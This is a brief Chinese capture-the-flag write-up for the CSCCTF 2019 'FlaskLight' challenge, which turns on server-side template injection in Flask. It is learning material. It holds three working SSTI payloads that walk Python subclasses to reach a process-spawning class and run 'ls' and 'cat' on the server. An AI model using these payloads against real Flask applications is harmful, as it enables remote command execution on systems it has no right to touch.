# \[CSCCTF 2019 Qual]FlaskLight

## \[CSCCTF 2019 Qual]FlaskLight

## 考点

* Flask SSTI

## wp

![](<../../.gitbook/assets/image (14).png>)

F12，给了提示

![](<../../.gitbook/assets/image (19) (1).png>)

题目是名字Flask，尝试一下SSTI

![](<../../.gitbook/assets/image (4).png>)

然后找可以利用的类

```
?search={{[].__class__.__mro__[1].__subclasses__()}}
?search={{[].__class__.__mro__[1].__subclasses__()[258]("ls",shell=True,stdout=-1).communicate()[0]}}
?search={{[].__class__.__mro__[1].__subclasses__()[258]("cat flasklight/coomme_geeeett_youur_flek",shell=True,stdout=-1).communicate()[0]}}
```

## 小结

1. 常规Flask SSTI
